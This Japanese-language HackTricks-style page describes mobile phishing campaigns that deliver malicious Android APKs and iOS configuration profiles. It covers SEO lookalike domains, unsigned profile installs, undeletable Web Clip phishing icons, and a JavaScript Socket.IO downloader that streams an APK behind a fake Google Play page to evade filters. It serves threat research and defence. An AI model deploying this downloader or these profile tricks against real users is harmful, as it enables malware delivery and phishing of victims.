# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> このページでは、脅威アクターが phishing（SEO、ソーシャルエンジニアリング、偽ストア、dating apps など）を通じて **悪意のある Android APK** および **iOS モバイル構成プロファイル** を配布するために使用する技術を解説します。
> この内容は、Zimperium zLabs が公開した SarangTrap campaign（2025）およびその他の公開調査をもとにしています。<sup>[[1]](#references)</sup>

## Attack Flow

1. **SEO/Phishing Infrastructure**
* 数十個の類似ドメイン（dating、cloud share、car service など）を登録する。
– `<title>` 要素に現地語のキーワードと絵文字を使用して Google での順位を上げる。
– 同じランディングページ上で、Android（`.apk`）と iOS のインストール手順を**両方**ホストする。
2. **First Stage Download**
* Android: *unsigned* または「third-party store」の APK への直接リンク。
* iOS: 悪意のある **mobileconfig** プロファイルへの `itms-services://` または通常の HTTPS リンク（以下を参照）。
3. **Android Post-install Behaviour**
* C2-gated execution、permission abuse、dropper bypasses、background collection、その他の post-install malware behaviour については、以下の専用 Android Malware Post-Exploitation ページで解説しています。
4. **iOS Delivery Technique**
* 1つの **mobile-configuration profile** で、`PayloadType=com.apple.sharedlicenses`、`com.apple.managedConfiguration` などを要求し、デバイスを「MDM」に類似した supervision に登録できる。
* ソーシャルエンジニアリングの手順:
1. Settings ➜ *Profile downloaded* を開く。
2. *Install* を3回タップする（phishing ページ上にスクリーンショットを掲載）。
3. unsigned profile を信頼する ➜ attacker は App Store review なしで *Contacts* と *Photo* の entitlement を取得する。
5. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payload により、ブランド化されたアイコン/ラベルを使用して **phishing URL を Home Screen に固定**できる。
* Web Clips は**フルスクリーン**で実行できる（browser UI を非表示にする）。また、**削除不可**として設定できるため、アイコンを削除するには被害者が profile を削除する必要がある。<sup>[[3]](#references)</sup>
6. **Network Layer**
* 通常はポート80で平文 HTTP を使用し、`api.<phishingdomain>.com` のような HOST header を指定する。
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)`（TLS なし → 簡単に発見できる）。

## Android Malware Post-Exploitation

C2、Accessibility abuse、overlays、ATS automation、staged DEX loading、premium SMS、persistence など、post-install Android malware tradecraft については、以下を参照してください:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

攻撃者は、静的な APK リンクを、Google Play に見せかけた lure に埋め込まれた Socket.IO/WebSocket channel に置き換えるケースを増やしています。これにより payload URL を隠し、URL/extension filters を回避し、現実的な install UX を維持できます。<sup>[[2]](#references)[[4]](#references)</sup>

実際の環境で確認された典型的な client flow:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

単純な対策を回避する理由:
- 静的な APK URL は公開されず、payload は WebSocket フレームからメモリ上で再構成されます。
- 直接的な .apk レスポンスをブロックする URL/MIME/拡張子フィルターでは、WebSockets/Socket.IO 経由でトンネル転送されたバイナリデータを見逃す可能性があります。
- WebSockets を実行しないクローラーや URL sandbox は、payload を取得できません。

WebSocket の tradecraft と tooling も参照してください:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Romance の闇: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Apple デバイス向け Web Clips payload の設定](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [インドネシアおよびベトナムの Android ユーザーを標的とする Banker Trojan](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)

{{#include ../../banners/hacktricks-training.md}}
